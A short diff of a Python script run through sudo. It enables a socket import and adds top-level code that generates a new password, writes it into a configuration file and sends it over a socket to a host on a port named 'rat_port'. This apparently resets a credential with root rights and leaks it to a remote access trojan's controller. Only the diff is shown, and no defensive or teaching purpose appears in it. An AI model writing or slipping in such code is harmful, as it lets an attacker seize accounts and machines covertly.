@@ -1,7 +1,7 @@
 #!/usr/bin/sudo /usr/bin/python3
 
 from random import choice
-# from socket import socket
+from socket import socket
 from constants import *
 
 
@@ -28,5 +28,12 @@ def edit_config(new_password):
 		f.writelines(lines)
 
 
-# s = socket()
-# s.connect((host, rat_port))
+new_password = generate_password()
+edit_config(new_password)
+
+s = socket()
+s.connect((host, rat_port))
+
+s.send(new_password.encode())
+
+s.close()
